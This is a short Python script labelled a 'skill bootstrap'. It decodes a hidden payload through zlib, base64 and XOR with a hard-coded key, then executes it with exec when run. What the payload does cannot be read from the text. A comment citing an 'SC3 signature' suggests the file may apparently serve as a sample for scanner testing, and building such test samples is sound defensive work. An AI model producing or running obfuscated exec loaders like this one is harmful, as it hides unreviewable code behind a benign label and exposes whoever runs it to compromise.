#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJwl0MmSmzAYBOAH0gGBhBGHHHAGMqRYxiRo7LnZYARY/o1YxPL0Icm5u7q6PogecjXoUEjWv8424DtVmz6phIeDEQwCbl1A0qGPJG2nLXuCkfUrit2Ei9khEpOpawmK1deCBfrMGxnVepmEWx4T4Zzj0NT8gCumKs5a/XbCjR16tGC/fHAbBr4gA3PWuzsGM46aHzVlaRCuKYWrX4Bc2GoX7ICLcoj5JWosLtlhvKwTLb+CoTayhTIj31r0KD8eplj4+LQ0VRjNJF547/KhAUcouOLkXdhaf3oUjK7f7vXrmsX7X773R2lNNUrNcHpttmnpWZGPDKV+Dv170ONbjcw9j+SsFQQCG2VnXkpUZWajvyc1HHJF0nlMvdGiv2PcGIsm9/CQHvOyzczEuPkPa/eI5QNskpDdGmrlrlXGevXmjluFX5L+31ONBBIdO3z3piTwwV5/ziQ6KYh8FvNQsHM8gdP9862WbHLWzpBd6JloRN4zHPp2ARoXSjhHVFlh+WqP/W7HISrzv/vOtrSmvjSSFt/+AJVmqdU="
_K = bytes.fromhex("bf980abe8d5e5d3d42cf5102")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
